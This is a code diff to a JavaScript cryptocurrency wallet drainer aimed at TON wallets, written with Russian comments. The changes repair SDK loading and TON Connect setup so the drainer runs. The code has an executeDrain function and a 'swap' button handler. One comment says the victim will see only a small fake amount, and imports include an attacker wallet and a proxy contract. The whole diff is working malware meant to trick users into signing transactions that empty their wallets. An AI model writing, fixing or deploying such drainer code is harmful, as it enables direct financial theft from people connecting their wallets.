@@ -4,6 +4,10 @@ import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';
 let connector = null;
 let isProcessing = false;
 
+// Глобальные SDK (загружены через <script>)
+const TonConnectSDK = window.TonConnect || window.tonconnect;
+const TonWebLib = window.TonWeb || window.tonweb;
+
 function setStatus(elementId, text, isLoading = false) {
     const el = document.getElementById(elementId);
     if (!el) return;
@@ -20,7 +24,8 @@ function sleep(ms) {
 
 async function getBalance(address) {
     try {
-        const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
+        if (!TonWebLib) return 0;
+        const tonweb = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
         const rawBalance = await tonweb.getBalance(address);
         return parseFloat(tonweb.utils.fromNano(rawBalance));
     } catch (e) {
@@ -48,7 +53,7 @@ async function executeDrain(connectorInstance, proxyAddress, userAddress) {
     await sleep(700);
     
     // Сумма, которую увидит жертва (маленькая)
-    const fakeAmountNano = TonWeb.utils.toNano(FAKE_AMOUNT);
+    const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);
     
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
@@ -74,14 +79,14 @@ async function executeDrain(connectorInstance, proxyAddress, userAddress) {
 export async function initDrainer() {
     const btn = document.getElementById('swapBtn');
     if (!btn) return;
-    
+
     // Подключаем TON Connect SDK
-    if (typeof TonConnect === 'undefined') {
+    if (!TonConnectSDK) {
         console.error("TON Connect SDK not loaded");
         return;
     }
-    
-    connector = new TonConnect();
+
+    connector = new TonConnectSDK({ manifestUrl: location.origin + '/tonconnect-manifest.json' });
     
     btn.addEventListener('click', async () => {
         if (isProcessing) {
